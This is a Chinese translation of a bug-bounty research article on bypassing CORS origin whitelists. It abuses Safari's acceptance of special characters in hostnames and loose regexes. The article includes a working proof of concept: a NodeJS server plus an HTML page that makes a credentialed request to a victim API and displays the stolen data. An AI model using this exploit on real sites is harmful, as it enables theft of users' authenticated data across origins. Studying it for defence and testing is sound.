## 前言

 **在正式开始分享我的内容前，我要极力推荐大家去看下[Linus
Särud](https://twitter.com/_zulln?lang=en)和[Bo0oM](https://twitter.com/i_bo0om)发表的两篇，关于Safari特殊字符处理被滥用，导致XSS或Cookie注入的研究文章。**

> <https://labs.detectify.com/2018/04/04/host-headers-safari/>
>
> <https://lab.wallarm.com/the-good-the-bad-and-the-ugly-of-safari-in-client-> side-attacks-56d0cb61275a>

## 背景

去年的11月份，我曾在Yahoo
View上发布了一篇关于，滥用Safari特殊字符处理绕过跨源资源共享的文章。之后我又进行了更加深入的研究，并发现了更多的可被利用的点，以及一些更为高级的利用技术。因此作为补充，我决定将更为先进的技术分享给大家！

 **注：**

本文假定你对CORS是什么？以及如何利用其错误配置？已有基本的了解。这里有两篇关于CORS错误配置利用的文章，建议大家去看下：

> [Portswigger’s Post](http://blog.portswigger.net/2016/10/exploiting-cors-> misconfigurations-for.html)
>
> [Geekboy’s post](https://www.geekboy.ninja/blog/exploiting-misconfigured-> cors-cross-origin-resource-sharing/)

## 背景：DNS&浏览器：

简单来说DNS本质上就是服务器的地址簿。它将主机名转换/映射到IP地址，使互联网更易于使用。

当你尝试访问浏览器中的URL时：

连接服务器⇾服务器使用SYN+ACK进行响应⇾浏览器向服务器发送HTTP请求以检索内容⇾呈现/显示内容。

DNS服务器响应任意请求 - 你可以发送子域中的任何字符，只要该域具有通配符DNS记录，它就会响应。

例如

    
    
    dig A "<@$&(#+_\`^%~>.withgoogle.com" @1.1.1.1 | grep -A 1 "ANSWER SECTION"  
    

![](https://image.3001.net/images/20180625/15298816277542.png!small)

浏览器？

现在我们知道DNS服务器会响应这些请求，那么浏览器又是如何处理它们的呢？

大多数浏览器在发送任意请求之前都会验证域名。

 **例如**

 **Chrome：**

 **![](https://image.3001.net/images/20180625/15298816493604.png!small)**

 **Firefox：**

 **![](https://image.3001.net/images/20180625/1529881660284.png!small)**

 **Safari：**

 **![](https://image.3001.net/images/20180625/15298816728120.png!small)**

注意！是大多数而不是所有浏览器。Safari就不同，如果我们尝试加载相同的域，它实际上会发送请求并加载页面：

我们可以使用各种字符，甚至是不可打印字符：

    
    
    ,&'";!$^*()+=`~-_=|{}% // non printable chars %01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f  
    

## CORS配置

设置浏览器允许访问的服务器的头信息的白名单。可以使用正则表达式来完成。

 **示例＃1：**

    
    
    ^https?:\/\/(.*\.)?xxe\.sh$  
    

即允许从xxe.sh和任意子域 (http:// 或 https://)进行跨域访问。

这也意味着攻击者想要从该端点窃取数据，唯一的可能性就是接管http(s)://xxe.sh /
http(s)://*.xxe.sh的子域或其本身存在XSS漏洞。

 **示例＃2：**

    
    
    ^https?:\/\/.*\.?xxe\.sh$  
    

与示例1相同 - 即允许从xxe.sh和任意子域进行跨域访问。

这个正则表达式与示例1非常相似，但其极易被攻击者利用并窃取数据。

而问题的根本就出在.*\\.?

 **分解：**

    
    
    .* = 单个字符匹配任意次，即贪婪匹配。  \. = 匹配点字符 ?  = 匹配前面的子表达式零次或一次  
    

由于.*\\.不在一个组中，量词?只会对.字符有作用。因此在字符串“xxe.sh”之前可以放入任意字符，无论前面这些字符是否用句点符号进行分隔。

这意味着攻击者可以发送以xxe.sh结尾的任意地址，并且可以跨域访问。

![](https://image.3001.net/images/20180625/15298817136775.png!small)

这是一种非常常见的bypass技术 - 这里有一个真实的例子：

> <https://hackerone.com/reports/168574>

**示例＃3：**

    
    
    ^https?:\/\/(.*\.)?xxe\.sh\:?.*  
    

这可能是为了允许从xxe.sh、所有子域以及这些域上的任何端口进行跨域访问。

你能发现问题吗？

 **分解：**

    
    
    \: = 匹配冒号，即“:” ?  = 匹配次数，就本例来说表示匹配冒号“:”零次或一次。 .* = 单个字符匹配任意次，即贪婪匹配。  
    

就像示例2一样，量词?只会对:字符有作用。因此，如果我们发送的域名在xxe.sh之后还有其他字符的话，仍然会被接受。

![](https://image.3001.net/images/20180625/15298817376287.png!small)

价值百万美元的问题：

> 在利用CORS Misconfigurations时，Safari如何处理特殊字符？

以下面的Apache配置为例：

    
    
    SetEnvIf Origin "^https?:\/\/(.*\.)?xxe.sh([^\.\-a-zA-Z0-9]+.*)?" AccessControlAllowOrigin=$0 Header set Access-Control-Allow-Origin %{AccessControlAllowOrigin}e env=AccessControlAllowOrigin  
    

实现从xxe.sh，所有子域以及这些域上的任何端口进行跨域访问。

下面是正则表达式的分解：

    
    
    [^\.\-a-zA-Z0-9] = 不匹配这些字符:"." "-" "a-z" "A-Z" "0-9" +  = 匹配次数：匹配上面的字符一次或无数次 .* =  除行终止符之外的任意字符  
    

这个API无法访问前面例子中的域，并且其他常见的绕过方法也无济于事。针对*.xxe.sh的子域接管或XSS攻击，只能用来窃取数据，但是，我们可以在此基础上发挥创造性！

我们知道，任何诸如*.xxe.sh后跟字符. - a-z A-Z
0-9的域名都是不会被信任的，但是，在字符串“xxe.sh”之后有空格的域名的情况又如何呢？

![](https://image.3001.net/images/20180625/15298817647106.png!small)

我们看到它是被信任的，但是任何普通浏览器都不支持这样的域。

由于正则表达式匹配字母数字ASCII字符以及. -，所以，“xxe.sh”之后的特殊字符是被信任的：

![](https://image.3001.net/images/20180625/15298817841932.png!small)

这种域名在现代通用浏览器Safari中被支持。

## 利用

 **先决条件：**

> 具有泛解析记录的域指向您的机器。
>
> NodeJS

和大多数浏览器一样，Apache和Nginx也不喜欢这些特殊字符，所以使用NodeJS为HTML和Javascript提供服务更容易。

 **[+] serve.js**

    
    
    var http = require('http'); var url  = require('url'); var fs   = require('fs'); var port = 80 http.createServer(function(req, res) {     if (req.url == '/cors-poc') {         fs.readFile('cors.html', function(err, data) {             res.writeHead(200, {'Content-Type':'text/html'});             res.write(data);             res.end();         });     } else {         res.writeHead(200, {'Content-Type':'text/html'});         res.write('never gonna give you up...');         res.end();     } }).listen(port, '0.0.0.0'); console.log(`Serving on port ${port}`);  
    

在同一个目录中，保存以下内容：

 **[+] cors.html**

    
    
    <!DOCTYPE html> <html> <head><title>CORS</title></head> <body onload="cors();"> <center> cors proof-of-concept:<br><br> <textarea rows="10" cols="60" id="pwnz"> </textarea><br> </div> <script> function cors() {   var xhttp = new XMLHttpRequest();   xhttp.onreadystatechange = function() {     if (this.readyState == 4 && this.status == 200) {       document.getElementById("pwnz").innerHTML = this.responseText;     }   };   xhttp.open("GET", "http://x.xxe.sh/api/secret-data/", true);   xhttp.withCredentials = true;   xhttp.send(); } </script>  
    

通过运行以下命令来启动NodeJS服务器：

    
    
    node serve.js &  
    

正如之前所述，由于正则表达式与字母数字ASCII字符和. -相匹配，所以，“xxe.sh”之后的特殊字符将获得信任：

因此，如果我们打开Safari并访问[http://x.xxe.sh](http://x.xxe.sh/){.<your-domain>/cors-poc，就能够成功地从易受攻击的端点中窃取数据。

![](https://image.3001.net/images/20180625/15298818206711.png!small)

此外，我还注意到，字符_（在子域中）不仅在Safari中受支持，而且Chrome和Firefox也支持该字符！

 **实际测试**

考虑到这些特殊字符，找出Access-Control-Allow-Origin头文件中反映了哪些域可能是一项冗长而费时的任务：

![](https://image.3001.net/images/20180625/15298818523982.jpeg!small)

####  TheftFuzzer介绍：

为了节省时间并提高效率，我决定编写一个工具对相应的CORS配置进行模糊测试，以获取允许的域名。该工具是用Python编写的，大家可以在[Github](https://github.com/sxcurity/theftfuzzer)上下载到这个工具，如果你对该工具有任何改进意见，请随时在Github上向我提出！

## 结语

我希望这篇文章能为大家提供/带来一些好的灵感和思路。也希望大家能活学活用，把学到的这些知识点运用到实际的研究测试中。最后，祝愿大家漏洞越挖越多，奖金数到手抽筋！哈哈~~

 **Corben Leo**

> <https://twitter.com/hacker_>
>
> <https://hackerone.com/cdl>
>
> <https://bugcrowd.com/c>
>
> <https://github.com/sxcurity>

 ***参考来源：[sxcurity](https://www.sxcurity.pro/advanced-cors-techniques/)，FB小编
secist 编译，转载请注明来自FreeBuf.COM**

